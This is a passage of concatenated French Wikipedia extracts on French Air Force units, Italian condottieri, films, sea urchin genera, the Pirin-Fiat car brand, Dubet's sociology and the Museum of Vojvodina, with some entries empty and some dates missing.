Les unités de protection de la BFSA assurent la sécurité et la protection des moyens de l’armée de l’air en France et à l'étranger.
Les commandos parachutistes de l’air (CPA) lui sont rattachés, ces derniers sont spécialisés dans les missions d’appui à la manœuvre aérienne et de recherche et sauvetage au combat et particulièrement dans les opérations spéciales uniquement pour le CPA 10 et le CPA 30. Ils interviennent dans le cadre des opérations aériennes et des opérations interarmées. Une vingtaine d’escadrons de protection protège aussi les bases aériennes en France métropolitaine, en outre-mer et sur les théâtres d’opérations. Ils participent également à la posture permanente de sûreté aérienne avec les tireurs d’élite de la capacité MASA (mesures actives de sûreté aérienne) par hélicoptère.
La BFSA compte également deux unités aériennes : l'escadron de transport 3/61 Poitou et l'escadron d'hélicoptères 1/67 Pyrénées. 
Enfin, plusieurs unités de formation dépendent de la BFSA pour former l’ensemble des aviateurs militaires du rang, instruire et qualifier le personnel fusilier, et maître-chien.
Parmi elles, le centre de préparation opérationnelle du combattant de l’armée de l’air (CPOCAA), inauguré en août 2015 à Orange qui accueille par an et le centre de formation à la survie et au sauvetage (CFSS) sur la base aérienne de Cazaux qui forme dans ce domaine particulier auprès du personnel navigant des trois armées.
Brigade des pompiers de l'air (BPA).
La Brigade des pompiers de l'air réunit les pompiers de l'air et les unités Nedex (Neutralisation et destruction des explosifs) de l'Armée de l'air et de l'espace. Elle compte 28 unités réparties en métropole, en outre-mer et à l'étranger pour un total d'environ 1500 personnes. Cette nouvelle brigade a été créée le 30 août 2021.
Le Centre de formation pompiers de l'air (CFPA) lui est rattaché. Le CFPA assure la formation des pompiers aéronautiques de armées, des pompiers de l'air et des spécialistes NRBC de l'armée de l'air et de l'espace. Il assure le maintien des compétences des pompiers aéronautiques des armées. Il accueille près de 1800 stagiaires par an.
Le premier Escadron spécialisé des pompiers de l'air (ESPA) est rattachée à la BPA.
L'état-major de la BPA est implanté sur la Base aérienne 120 de Cazaux, historiquement liée au domaine de la pyrotechnie, du secours incendie et de la menace nucléaire, radiologique, biologique et chimique (NRBC).
Insigne.
L'insigne du CFA a été homologué le octobre 2014 sous le numéro A 1445.
L'insigne est constitué :

</doc>
<doc id="9625034" url="https://fr.wikipedia.org/wiki?curid=9625034" title="L'Homme qui valait des milliards">
L'Homme qui valait des milliards

L'Homme qui valait des milliards est un film français réalisé par Michel Boisrond et sorti en 1967.
Synopsis.
Evadés de prison, Sarton et Novak, sont enlevés par deux anciens complices de Novak voulant récupérer de faux dollars fabriqués par les Allemands pendant la guerre...

</doc>
<doc id="9625044" url="https://fr.wikipedia.org/wiki?curid=9625044" title="Después de Lucia">
Después de Lucia



</doc>
<doc id="9625045" url="https://fr.wikipedia.org/wiki?curid=9625045" title="Frank Edgar">
Frank Edgar



</doc>
<doc id="9625050" url="https://fr.wikipedia.org/wiki?curid=9625050" title="Olivier Guéant">
Olivier Guéant

Olivier Guéant est un mathématicien et entrepreneur français né en 1984, professeur à l'université Paris-Cité, spécialiste des mathématiques appliquées à l’économie et à la finance.
Biographie.
Ancien élève de l'École normale supérieure (2003 S) et étudiant invité ("special student") de l'université Harvard, Olivier Guéant mène à la suite de ses études en mathématiques et en économie, une thèse de doctorat en mathématiques appliquées sur la théorie des jeux à champ moyen sous la direction de Pierre-Louis Lions, récompensée par le prix Rosemont Demassieux. Il est par ailleurs diplômé de l'ENSAE et titulaire d'un master 2 d'économie de l'École d'économie de Paris. 
Il est professeur de mathématiques appliquées à l'université Paris-Cité depuis 2025 après l'avoir été pendant 9 ans à l'université Paris-I-Panthéon-Sorbonne, et professeur associé de finance à l'ENSAE.
Travaux.
Théorie des jeux à champs moyens.
Olivier Guéant a soutenu la première thèse sur la théorie des jeux à champs moyens. Il est notamment à l'origine des méthodes numériques de référence pour les jeux à champs moyens à Hamiltonien quadratique.
Mathématiques financières.
Spécialiste de mathématiques financières, il a publié des articles et ouvrages sur la liquidité, l'exécution optimale et le market making, mais aussi sur le pricing et la gestion d'actifs. Il a notamment, avec Charles-Albert Lehalle et Joaquin Fernandez-Tapia résolu les équations d'Avellaneda-Stoikov.
Il a par ailleurs travaillé avec Roger Guesnerie, Jean-Michel Lasry et Olivier David Zerbib sur la notion de taux écologique.
Numismatique.
Olivier Guéant est par ailleurs spécialiste des jetons royaux et des essais monétaires et est à l'origine, avec Michel Prieur, de la classification Guéant-Prieur (GP.) des bustes royaux sur l'avers des jetons royaux entre le et le , complétant ainsi la classification de référence des revers de Feuardent datant du début du .

</doc>
<doc id="9625051" url="https://fr.wikipedia.org/wiki?curid=9625051" title="Tin-Tin Tatoueur">
Tin-Tin Tatoueur



</doc>
<doc id="9625058" url="https://fr.wikipedia.org/wiki?curid=9625058" title="Bucks County Classic">
Bucks County Classic



</doc>
<doc id="9625069" url="https://fr.wikipedia.org/wiki?curid=9625069" title="Verge NECXS 2015-2016">
Verge NECXS 2015-2016

Les Verge NECXS 2015-2016 ("New England Cyclocross Series") ont lieu du 26 septembre à Gloucester au 6 décembre 2015 à Warwick. Elles comprennent six manches masculines et féminines, toutes disputées en Nouvelle-Angleterre.
Hommes élites.
Classement général.
"Au 27/09/14"
Femmes élites.
Classement général.
"Au 27/09/14"

</doc>
<doc id="9625073" url="https://fr.wikipedia.org/wiki?curid=9625073" title="Róisín Heneghan">
Róisín Heneghan

Róisín Heneghan est une architecte et designer irlandaise. C'est la cofondatrice des "", deux sociétés d'architecture basées à Dublin et à Berlin, avec Shih-Fu Peng.
Éducation.
Róisín Heneghan a étudié et reçu un baccalauréat à la "University College Dublin" à Dublin et détient un Master en Architecture de l"'Université Harvard".

</doc>
<doc id="9625077" url="https://fr.wikipedia.org/wiki?curid=9625077" title="Championnat d'Antigua-et-Barbuda de football 2001-2002">
Championnat d'Antigua-et-Barbuda de football 2001-2002

La saison 2001-2002 du Championnat d'Antigua-et-Barbuda de football est la trente-et-unième édition de la "Premier Division", le championnat de première division à Antigua-et-Barbuda. Les douze formations de l'élite sont regroupées au sein d'une poule unique où elles s'affrontent deux fois, à domicile et à l'extérieur. En fin de saison, pour permettre le passage du championnat à 10 clubs, les quatre derniers du classement sont relégués et remplacés par les deux meilleurs clubs de "First Division".
C'est le Parham FC qui remporte la compétition cette saison après avoir terminé en tête du classement final, avec quatre points d'avance sur le quadruple tenant du titre, Empire FC. Il s’agit du deuxième titre de champion d'Antigua-et-Barbuda de l'histoire du club.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :

</doc>
<doc id="9625078" url="https://fr.wikipedia.org/wiki?curid=9625078" title="Sociologie de l'expérience">
Sociologie de l'expérience

Disciple d'Alain Touraine, militant de l'intervention sociologique, le sociologue François Dubet propose la sociologie de l'expérience comme alternative aux paradigmes dominants de la sociologie traditionnelle.
Explication.
Holisme, individualisme méthodologique, interactionnisme, sont autant de "modèles durs" que les nombreuses enquêtes de terrain de Dubet discréditent vu l'incomplétude de ces sociologies, aux théories partielles. Celui-ci souligne l' (Dubet, 1994). Il fait le constat du déclin des éléments traditionnels (école, famille, religion, classes sociales, rôles sexués...), non remplacés : (Dubet, op. cit).
Pour Dubet, la société est un système social, soit la juxtaposition d'un marché, d'une communauté, d'une historicité, et surtout, d'acteurs pris dans des logiques d'actions intrinsèquement liées, toujours à l'œuvre, mais hiérarchisées par l'individu selon les contextes qu'il traverse.
L'action, qu'il renomme , est (Dubet, 2007, ). Il nomme ces trois logiques (ou systèmes) d'actions : la logique d'intégration, la logique de subjectivation et la logique de sélection.
Trois systèmes ou logiques d'action enchevêtrés.
Selon lui, les individus . (Dubet, 2004).
Ces trois systèmes imbriqués sont toutefois hiérarchisés. Selon le contexte, l'acteur privilégie l'un ou l'autre des trois systèmes d'action.
Un système d’action historique (subjectivation).
L’individu a . Ce système ou logique d'action est premier quand l'individu se veut critique, distant avec son groupe d'appartenance.
 (Dubet, 1994, ).
Un système d’intégration (socialisation).
Ce système ou logique d'action (Dubet, 1994, ). Ce système guide l'action de l'acteur . (op. cit, )
Un système d’interdépendance (stratégie).
Dans les situations où l'acteur se trouve dans un contexte de concurrence, où il doit défendre des intérêts, c'est cette logique 
d'action qui guide ses choix, (Dubet, op. cit, ).
Ainsi, selon qu'il cherche à préserver ses liens avec un groupe (système d'intégration), ou qu'il cherche à se comprendre, à se faire 
critique (système d'action historique ou subjectivation) ou encore qu'il se fait stratège pour protéger ses intérêts (système 
d'interdépendance), l'acteur est plutôt dans l'un, l'autre de ces trois systèmes d'action.
Application de la sociologie de l'expérience au terrain d'enquête.
L'approche du terrain d'enquête, préconisée par F. Dubet, a fait florès dans le monde de la recherche qualitative, qui privilégie la vision du monde des enquêtés. (Dubet, 1994).
L'expérience scolaire :
«"  L’élève peut travailler parce que c' est ainsi, parce qu'il a intériorisé l'obligation du travail scolaire dans sa famille et à l' école, et c' est essentiel. Mais cet élève doit et peut aussi travailler s'il est capable de percevoir l'utilité, scolaire ou non, de ce travail, s'il est en mesure ou en position d’anticiper les gains, ce qui ne recouvre pas exactement le premier type de signification. Enfin, l'élève peut travailler parce qu'il éprouve ce travail comme une forme de réalisation de soi, d'intérêt intellectuel."» (Dubet et Martuccelli, 1996, p.65).
en s'appuyant sur la notion d'expérience sociale telle que définie par Dubet, peut être perçue comme une manifestation concrète de l'interaction entre l'individu et le système éducatif. Elle englobe les multiples interactions entre les élèves, les enseignants et les pairs au sein de l'environnement scolaire, ainsi que les stratégies d'adaptation et les choix que les élèves déploient pour atteindre leurs objectifs académiques.

</doc>
<doc id="9625084" url="https://fr.wikipedia.org/wiki?curid=9625084" title="Andrea Malatesta">
Andrea Malatesta

Andrea Malatesta ou encore Malatesta da Cesena né à Cesana et mort dans cette même ville le est un condottiere italien. Seigneur de Cesena, Cervia Bertinoro et Fossombrone. Il était un membre de la puissante maison de Malatesta.
Biographie.
Andrea Malatesta est le frère de Carlo I et Pandolfo III Malatesta, avec lequel il combattit à plusieurs reprises.
En 1385, Andrea Malatesta hérite de son père Galeotto de Cesena puis Cervia et Bertinoro et en 1388 de Fossombrone.
En 1397, il combat avec 200 chevaliers pour les Bolonais en soutien des Florentins contre Gian Galeazzo Visconti, duc de Milan. Il repousse les troupes d'Alberico da Barbiano puis se porte à la défense de Mantoue où il est toutefois défait par Jacopo dal Verme, qui prend la ville. L'année suivante, échoue avec Braccio da Montone, qui dirigeait un parti d'exilés de Pérouse, dans la tentative de reprendre Mantoue sous la coupe de Biordo dei Michelotti.
En 1398, Malatesta nommé sénateur de Rome par le pape Boniface IX. En 1402, avec son frère Pandolfo III, il entre au service des Visconti et participe à l'expédition contre Bologne et à la bataille de Casalecchio. Après la mort du duc de Milan, il change de camp et est de nouveau embauché par le pape, en 1403 il expulse les Visconti de Bologne. En 1404 il lutte contre Alberico da Barbiano, et en 1406 prend Forlì.
En 1408, Malatesta est de nouveau au service de Giovanni Maria Visconti de Milan, avec la tâche de contrer Facino Cane sur le territoire de Pavie. 
Retour à Cesena, il s'allie avec Niccolò III d'Este de Ferrare contre le seigneur de Parme, Ottobono Terzi, prenant part à la défaite de ce dernier à Modène par Muzio Attendolo. Retourné à Cesena, en 1413 il fait la guerre à l'antipape Jean XVIII, soutenu par le nouveau roi de Naples Ladislas .
Après d'autres opérations mineures, Malatesta rentre au service de Pérouse, qui le nomme Capitano generale, contre Braccio da Montone. Cependant, tombé malade il est remplacé par son frère Carlo I Malatesta et meurt en .
Sa fille Parisina était la deuxième épouse de Niccolò III d'Este, marquis de Ferrare.

</doc>
<doc id="9625088" url="https://fr.wikipedia.org/wiki?curid=9625088" title="Echinosigra">
Echinosigra

 
Echinosigra est un genre d'oursins irréguliers de la famille des Pourtalesiidae. 
Description et caractéristiques.
Ce sont des oursins très irréguliers, dont la forme a évolué de la sphère vers une forme très allongée et pourvue d'un rostre, évoquant une bouteille. De plus, cette forme est très évolutive avec l'âge de l'animal, ce qui complique encore plus l'identification. 
Habitat et mode de vie.
Ce sont des oursins abyssaux, inféodés au plus profond des abysses.
Ils semblent se nourrir à la manière des holothuries, en ingérant la pellicule superficielle du sédiment qui contient une fraction de matière nutritive. 
Liste des espèces.
Selon :

</doc>
<doc id="9625096" url="https://fr.wikipedia.org/wiki?curid=9625096" title="Protéine-kinase C">
Protéine-kinase C

En biologie cellulaire, la protéine-kinase C, communément abrégée en PKC, est une famille d'enzymes de type protéine-kinase qui sont impliquées dans le contrôle de la fonction d'autres protéines par la phosphorylation des groupes hydroxyles des résidus d'acides aminés sérine et thréonine sur ces protéines. Les enzymes PKC sont à leur tour activées par des signaux dus à l'hydrolyse du PIP2 en diacylglycérol membranaire (DAG) ou IP3 cytosolique qui permet l'ouverture du récepteur ionotropique à l'IP3 libérant du calcium (Ca2+) dans le cytosol. Les enzymes PKC jouent donc un rôle important dans plusieurs cascades de transduction du signal.

</doc>
<doc id="9625107" url="https://fr.wikipedia.org/wiki?curid=9625107" title="Ratiboř (Jindřichův Hradec)">
Ratiboř (Jindřichův Hradec)



</doc>
<doc id="9625115" url="https://fr.wikipedia.org/wiki?curid=9625115" title="Malatesta IV Malatesta">
Malatesta IV Malatesta

Malatesta IV Malatesta dit « Malatesta dei Sonetti », né à Pesaro en 1370 et mort à Gradara le , est un condottiere italien. Seigneur de Pesaro, Fossombrone, Fratta Todina, Gradara, Jesi, Todi, Narni, Orte et Acquasparta. Il était un membre de la maison Malatesta.
Malatesta IV Malatesta est également l'auteur de poèmes, recueillis dans un "Canzoniere", influencé par Pétrarque et par la littérature contemporaine toscane.
Biographie.
Malatesta IV Malatesta, né à Pesaro, il était le seul fils de Pandolfo II Malatesta et de sa seconde épouse Paola Orsini. On lui a donné le surnom de « dei sonetti » ("des Sonnets") en raison de son amour pour la littérature et les beaux-arts. Il a épousé Élisabeth da Varano, qui lui a donné sept enfants: Galeazzo, Carlo, Galeotto, Paola, Pandolfo, Cleofa et Taddea.
En 1385 il devient seigneur de Pesaro et est engagé par le pape Urbain VI pour lutter contre antipape Clément VII. En 1390, il combat les Bolonais dirigés par Giovanni da Barbiano, puis est engagé par la république de Florence contre les Visconti de Milan. En 1392, il est excommunié par le pape pour avoir conquis Todi, une possession papale.
En 1394 l'antipape Benoît XIII, le nomme capitaine général de Bologne, pour lutter contre le pape Boniface VIII. Pendant le conflit il détruit plusieurs villes de l'Ombrie et du Latium prenant le contrôle de Narni et Orte.
En 1404 Malatesta entre au service de la république de Venise, qui lui confie soldats pour lutter contre les Carraresi de Padoue. Cependant, les troupes vénitiennes sont battues et malade, il retourne à Pesaro à la fin de 1404 et entreprend un pèlerinage à Saint-Jacques-de-Compostelle.
De 1409 à 1412, il est au service de l'antipape Alexandre V allié des Florentins contre les forces de Ladislas Ier de Naples.
En 1415, il défend ses fiefs de l'Ombrie contre Braccio da Montone. En 1416-1417 il est impliqué dans la guerre de Jesi, qui épuise son trésor.
En 1423, il est recruté par Florence dans la guerre contre Milan. En 1424, lors de bataille de Zagonara, son cousin Carlo I Malatesta est fait prisonnier ainsi que ses fils Galeazzo et Carlo II après avoir été assiégés dans Gradara par Angelo della Pergola. L'année suivante, Malatesta signe un traité de paix à Abbiategrasso.
Il se retire malade à Gradara, où il meurt le .
Comme protecteur des arts, il a hébergé à Persaro des artistes comme Francesco Casini et le peintre Mariotto di Nardo, entretenant une correspondance avec les humanistes Coluccio Salutati et sa belle-fille Battista Malatesta.

</doc>
<doc id="9625121" url="https://fr.wikipedia.org/wiki?curid=9625121" title="Généralissime Joffre">
Généralissime Joffre



</doc>
<doc id="9625126" url="https://fr.wikipedia.org/wiki?curid=9625126" title="Pirin-Fiat">
Pirin-Fiat

Pirin-Fiat est une marque commerciale automobile bulgare. Elle fut créée en 1966 pour une durée contractuelle initiale de cinq ans. Elle cessa toute activité en 1971.
Histoire.
Contexte de l'époque.
Dans les années d'après-guerre, tous les pays de l'Est sont sous "protectorat" de l'Union Soviétique. Ils ne sont pas autonomes et dépendent du pouvoir central de Moscou pour toute activité économique avec des prix des matières premières et des produits finis que l'on qualifierait de "politiques". En effet, il coûtait moins cher à un citoyen de ces pays de faire en avion qu'en train ou encore en voiture. Le prix de l'essence était 3 fois inférieur à celui pratiqué en occident, la valeur du rouble était "officiellement" bien supérieure à celle du dollar mais en transactions locales, on pouvait obtenir pour .
Dans ces conditions, il est facile de comprendre qu'il suffisait aux dirigeants soviétiques d'imposer une taxe ou un impôt pour refuser un produit nouveau ou l'implantation d'une usine difficilement contrôlable.
L'automobile en Bulgarie.
À cette époque, la Bulgarie ne disposait d'aucune industrie automobile. Toutes les rares voitures en circulation, camionnettes, camions ou autobus étaient russes (ZIL ou Moskvitch) ou tchèques (Skoda).
Les dirigeants bulgares et le président de la République populaire de Bulgarie, Todor Jivkov, voulurent lancer en 1959 un plan quinquennal d'industrialisation. Comprenant que l'avenir de leur pays devait passer par là, ils voulaient promouvoir l'industrie automobile, forte pourvoyeuse d'emplois. Ce plan courageux de développement, incompatible avec la stratégie soviétique sera un énorme échec.
De longues discussions avec plusieurs constructeurs automobiles occidentaux furent engagées et il faudra attendre le pour qu'un accord de coopération soit signé entre le constructeur italien Fiat qui était aussi en négociation avec l'URSS pour la création de la marque AutoVaz plus connue sous le nom Lada en Europe, soit signé à Turin.
Le contrat avec Fiat.
Le projet de contrat négocié entre Fiat Auto et la société d'État "SPC Balkankar" stipulait :
Il faudra attendre le pour que les bulgares signent un contrat qui ne reprenait pas tous les accords conclus.
Le contrat final stipulait que la société "SCP Balkankar" importerait en CKD les modèles Fiat 850 berline mais aussi des Fiat 850 Coupé, Fiat 124 berline et break. Le nombre de chaque modèle était aussi très précisément mentionné pour un total de 5.000 unités annuelles.
Initialement, Fiat devait aussi fournir la totalité de l'outillage, des pièces et les composants nécessaires à l'assemblage des voitures, mais le but restait de passer progressivement d'un simple assemblage à la fabrication locale d'une grande partie d'entre eux en Bulgarie, avec la création d'une véritable usine de production.
("NDR : la société "SPC Balkankar" était une coopérative bulgare industrielle d'État").
Le contrat prévoyait également que, dans la phase initiale, "SPC Balkankar" payerait le constructeur italien non pas en argent mais sous forme d'échange (troc) avec des produits bulgares, méthode très fréquente avec les pays de l'ex bloc de l'Est. Dans la liste des produits "échangés" figurait les feuilles de tabac exportées par la société bulgare "ETO" (organisation bulgare du commerce pour l’exportation).
La production automobile.
L'assemblage des voitures Fiat dura 5 ans, de 1967 à 1971, conformément au contrat signé qui ne fut pas renouvelé. Le constructeur français Renault a subi le même cuisant échec en Bulgarie avec l'assemblage chez Bulgarrenault de la 4L entre 1966 et 1970.
Le lot 1A comprenant les 18 premières Fiat 850 est livré à l'"Usine de voitures des Balcans" à Lovetch le , comme stipulé au contrat.
La main d'œuvre bulgare avait été formée sur les chaînes de montage Fiat de l'usine de Mirafiori. Le nom commercial figurant sur les brochures publicitaires restera "Pirin-Fiat" pour sa consonance bulgare même s'il ne figurera jamais sur les voitures qui porteront le seul logo Fiat.
La première Pirin-Fiat 850 quitte la chaîne d'assemblage le , soit 1 mois et demi après la livraison des containers en CKD.
Le , le lot 2A de Fiat 850 à assembler est livré à l'usine bulgare, en kits complets. Cette livraison intervient 10 mois après la première livraison de 18 voitures. Le contrat initial prévoyait un volume de 3.000 à 5.000 voitures par an ! Le marché bulgare ne tenait manifestement pas ses promesses.
Au cours des mois d'avril et , l'ingénieur bulgare Dimitar Damyanov est envoyé à Turin pour négocier l'achat à Fiat de machines-outils de soudure et d'assemblage pour équiper l'usine de Lovetch, restée avec un équipement très artisanal.
Le , l'ingénieur italien Brasio se rend à l'usine des balcans de Lovetch pour préparer l'installation d'une nouvelle unité de peinture qui sera mise en service le de la même année.
La fin de la production.
Le contrat de livraison de voitures en kits CKD d'une durée initiale de 5 ans, conclu entre la "SPC Balkankar" et Fiat arrive à son terme en . Les quantités d'automobiles initialement prévues n'ont jamais été respectées, vu l'étroitesse du marché bulgare, le niveau de vie local et la volonté de Moscou de maintenir sous sa coupe la fourniture limitée de voitures dans les pays sous tutelle. Le contrat n'a pas été renouvelé.
La dernière voiture Fiat assemblée quittera l'usine de Lovetch le .
Véhicules assemblés.
La production totale fut de : 758 unités.

</doc>
<doc id="9625127" url="https://fr.wikipedia.org/wiki?curid=9625127" title="I Love You (film, 1986)">
I Love You (film, 1986)

 est une comédie dramatique franco-italienne réalisée par Marco Ferreri et sortie en 1986.
Il a été présenté en compétition au Festival de Cannes 1986. Le film raconte l'histoire de Michel, un séducteur (Christophe Lambert), qui travaille dans une agence de voyages. Il vit seul avec son copain Yves (Eddy Mitchell), chômeur. Il trouve un jour un porte-clefs en forme de visage féminin, qui répond quand on le siffle, et il en tombe amoureux.
Synopsis.
Le personnage principal du film est un jeune homme nommé Michel. Il vit à la périphérie d'une grande ville industrielle. Michel se caractérise par le fait qu'il ne fait aucune distinction particulière entre les adultes et les enfants, les gens et les animaux, les êtres vivants et les objets inanimés.
Le voisin chômeur Ives « né sous le signe de la scoumoune, ascendant pas de cul », qui vient s'entasser régulièrement dans l'appartement de Michel, ne l'irrite pas, il ne le remarque même pas. Michel rompt avec son ex-petite amie sans la moindre émotion ; la jeune fille qui le suit partout et lui avoue son amour n'éveille aucun sentiment chez lui non plus. Michel ne refuse pas le sexe, mais il ne sait pas aimer les gens qui l'entourent. En revanche, il aime ses objets, comme sa moto. Le réalisateur exprime la manifestation anormale des attitudes consuméristes à travers les publicités qui jaillissent du téléviseur. Michel est un produit typique du système de consommation, et celui-ci lui a joué un tour cruel.
Un jour, après s'être moqué d'un couple d'amoureux et les avoir chassés, il trouve un porte-clefs sur le parking. Le porte-clefs est un simple jouet en forme de tête de femme miniature qui répond à un sifflement avec une voix de femme disant . Le jeune homme est complètement séduit. Michel entame une « histoire d'amour » avec le porte-clefs, qui lui fait vivre toutes les expériences romantiques qu'il vivrait avec une maîtresse : le Michel sans âme devient jaloux de sa « bien-aimée » lorsqu'elle répond aux sifflets d'autres hommes. Dans un accès de jalousie, il fonce délibérément dans un mur avec sa moto, après quoi il perd la capacité de siffler à cause d'une dent cassée. L'impossibilité d'entendre la phrase magique le rend fou, il sollicite alors les services d'une prostituée, mais celle-ci ne peut pas prononcer la phrase chérie comme le souhaiterait Michel.
Dans ce film, une scène fait référence à une scène d'un autre film de Ferreri, "Dillinger est mort". Sur l'écran de télévision, on voit des plans de ce film qui poussent Michel à commettre un acte inhérent à toute personne jalouse, à savoir le « meurtre » de sa bien-aimée - un bibelot. Avec son voisin Ives, ils accomplissent l'acte rituel en brisant le jouet à l'aide d'un marteau.
Il semble que la libération tant attendue va arriver. Mais Michel voit à la télévision l'image d'un voilier de conte de fées avec une belle fille à bord, les sirènes l'appellent à nouveau et le forcent à prendre la mer à la poursuite de son nouveau rêve. Le beau mirage disparaît lentement dans les vagues sur l'air de "La paloma", et cette vision devient la dernière de la vie de Michel...

</doc>
<doc id="9625136" url="https://fr.wikipedia.org/wiki?curid=9625136" title="Echinocrepis">
Echinocrepis

Echinocrepis est un genre d'oursins irréguliers de la famille des Pourtalesiidae. 
Description et caractéristiques.
Ce sont des oursins très irréguliers, dont la forme a évolué de la sphère vers une forme triangulaire allongée. 
Habitat et mode de vie.
Ce sont des oursins abyssaux. 
Ils semblent se nourrir à la manière des holothuries, en ingérant la pellicule superficielle du sédiment qui contient une fraction de matière nutritive. 
Liste des espèces.
Selon :

</doc>
<doc id="9625143" url="https://fr.wikipedia.org/wiki?curid=9625143" title="Círculo de Bellas Artes (Madrid)">
Círculo de Bellas Artes (Madrid)



</doc>
<doc id="9625145" url="https://fr.wikipedia.org/wiki?curid=9625145" title="David McNally (réalisateur)">
David McNally (réalisateur)

David McNally, né en 1960 à Liverpool, en Angleterre, au (Royaume-Uni), est un réalisateur britannico-canado-américain.
Il est surtout connu pour avoir réalisé les films "Coyote Girls" (2000) et "Kangourou Jack" (2003).
Carrière.
McNally commence sa carrière comme , puis comme réalisateur de publicités. Il est notamment l'auteur de la publicité du homard de Budweiser, diffusée et très remarquée lors du Super Bowl XXXIII.
En 2000, McNally commence sa carrière au cinéma en réalisant "Coyote Girls" (2000), puis "Kangourou Jack" en 2003. En 2006, il est le co-créateur de "Justice".

</doc>
<doc id="9625157" url="https://fr.wikipedia.org/wiki?curid=9625157" title="David McNally">
David McNally

David McNally peut faire référence à :

</doc>
<doc id="9625166" url="https://fr.wikipedia.org/wiki?curid=9625166" title="Musée de Voïvodine">
Musée de Voïvodine

Le musée de Voïvodine (en serbe cyrillique : ; en serbe latin : ) est un musée situé à Novi Sad, la capitale de la province autonome de Voïvodine, en Serbie. Créé en 1847 à Pest, il présente des collections d'archéologie, d'histoire et d'ethnologie. Le bâtiment principal dans lequel il est installé, 35 rue "Dunavska", est inscrit sur la liste des monuments culturels protégés de Serbie (identifiant SK 2015).
Historique.
La création du musée est liée à l'activité de la Matica srpska, la plus importante institution culturelle serbe de l'empire d'Autriche puis de l'Autriche-Hongrie, créée à Pest en 1826. L'idée du musée apparaît déjà en 1825 dans la "", une revue qui allait devenir la première publication de la Matica srpska, et elle a été concrétisée le , avec la décision d'établir une (en serbe : ), c'est-à-dire un musée qui .
La première collection du musée, autour du riche fonds constitué par l'aristocrate a ouvert au public sous le nom de « Musée de la Matica srpska » (en serbe : ) le à Novi Sad ; en plus des collections d'archéologie, d'histoire et d'ethnologie, le musée abritait une importante collection de peinture.
Le a été créé le grand complexe du « Musée de la Voïvodine » (en serbe : ), rassemblant de nombreuses collections d'archéologie, d'ethnologie, d'histoire, d'histoire de l'art ainsi que des collections de zoologie, de botanique, de géologie, de paléontologie et de minéralogie ; le musée avait en plus la charge de superviser techniquement tous les musées de la province autonome de Voïvodine. Il a été installé au 35 de la rue "Dunavska". Plus tard, il a aussi coordonné d'autres institutions comme le Musée du mouvement des travailleurs et de la révolution populaire, le musée de la ville de Novi Sad, l'Institut provincial pour la protection des monuments culturels, l'Institut provincial pour la protection de la nature, le Musée d'art dramatique de Voïvodine et le Musée de l'agriculture de Voïvodine.
Architecture.
Le bâtiment principal du musée, situé 35 rue "Dunavska", a été construit en 1900 sur des plans de l'architecte (1851-1937), originaire de Budapest, et réalisé par Somon János et Imre Kireger, qui ont travaillé sur un grand nombre d'édifices de Novi Sad de cette époque ; il était alors destiné à accueillir le tribunal de district de la ville.
Le bâtiment est caractéristique du style éclectique. La façade principale, qui s'articule symétriquement autour du portail, est rythmée par des avancées et couronnée par un attique surmonté d'une balustrade. Le toit lui-même est dominé par deux dômes. Le portail d'entrée est encadré de colonnes et rythmé par des pilastres ainsi que par la forme et la taille des fenêtres ; il est doté d'une riche décoration plastique, notamment à l'étage.
Le musée partage ce bâtiment avec les Archives de Voïvodine.
Le bâtiment situé au 37 de la même rue a été construit en 1970 sur des plans de l'architecte ; il est caractéristique du style moderne.
Sites.
Aujourd'hui, le musée de Voïvodine gère quatre sites :
Départements.
Le musée de Voïvodine est divisé en cinq grands départements, eux-mêmes parfois subdivisés en sections : archéologie, histoire, ethnologie, complexe-musée de Kulpin, publication et bibliothèque.
Collections.
Archéologie.
Le département d'archéologie est subdivisé en quatre grandes sections : Préhistoire, Antiquité, numismatique et archéobiologie. La collection permanente est présentée dans trois salles, sur une surface d'environ ; elle couvre une période allant du Paléolithique au début du Moyen Âge.
Pour la Préhistoire, le Néolithique (6000-3200 ), qui correspond à l'installation des premières cultures agricoles en Voïvodine, est la mieux représentée, notamment les cultures de Starčevo, de Vinča, de Potisje et de Lenđel, par des découvertes réalisées à Donja Branjevina près d'Odžaci, Starčevo, Golokut près de Vizić et Gomolava près de Hrtkovci. Une sous-section est plus particulièrement consacrée au site de Gomolava, qui figure sur la liste des sites archéologiques d'importance exceptionnelle de la république de Serbie (identifiant AN 108), et une autre au site de Feudvar, situé près de Mošorin au bord du plateau de Titel, lui aussi classé comme exceptionnel (AN 123). D'autres sites sont également présents dans le musée comme celui de Gradina sur le Bosut (AN 122).
L'Antiquité est notamment représentée par deux casques de cérémonie en or du découverts à Berkasovo près de Šid et par les fresques d'une tombe à Beška.
Histoire.
Le musée abrite plusieurs collections historiques : la collection de numismatique, la collection d'éducation physique et des sports, la collection des registres castraux, la collection des beux-arts, la collection d'arts décoratifs et la collection de pédagogie.
On y trouve des armes, des drapeaux, des blasons, des décorations, des médailles, des documents sur l'économie de la Voïvodine, sur les personnalités et les partis politiques, sur les familles royales, les personnages célèbres, notamment dans le domaine de la culture, ainsi que des documents sur le clergé, la vie spirituelle et les monastères de la Fruška gora, sur la révolution de 1848-1849 et la Première Guerre mondiale ; parmi ces documents figurent des cartes postales et des photographies et des legs comme ceux de Jovan Nikić, de Đorđe Krasojević, du patriarche Josif Rajačić et de Jovan Erdeljanović.
Les collections du 37 rue "Dunavska", consacrées à l'histoire de la Voïvodine au , présentent des documents liés à l'union de la province à la Serbie et à la création du royaume des Serbes, Croates et Slovènes sous la direction de la dynastie des Karađorđević en 1918, sur le développement économique de la région dans l'entre-deux-guerres, sur la lutte anti-fasciste entre 1941 et 1945 et sur le rôle de l'Armée rouge dans la libération de la Voïvodine et de la Yougoslavie.
Ethnologie.
Le département d'ethnologie est subdivisé en 6 sections : la collection d'architecture et de mobilier populaire de l'l'ethno-parc Brvnara, la collection d'agriculture traditionnelle, la collection de vêtements et d'accessoires populaires, la collection de textiles d'intérieur, la collection de témoignages écrits et audio-visuels et la collection d'artisanat, la collection de vie sociale et de culture spirituelle et la collection de poterie et d'artisanat familial.
Manifestations.
Le musée de Voïvodine organise un festival masqué, qui a lieu en février-mars, et participe à la Nuit européenne des musées.

</doc>
<doc id="9625173" url="https://fr.wikipedia.org/wiki?curid=9625173" title="Liste de jeux Atari Inc. (filiale d'Atari SA)">
Liste de jeux Atari Inc. (filiale d'Atari SA)

La liste de jeux Atari Inc. répertorie les jeux développés et édités par l'entreprise Atari Inc. depuis le début des années 2000.

</doc>
<doc id="9625175" url="https://fr.wikipedia.org/wiki?curid=9625175" title="Atelier (série télévisée)">
Atelier (série télévisée)

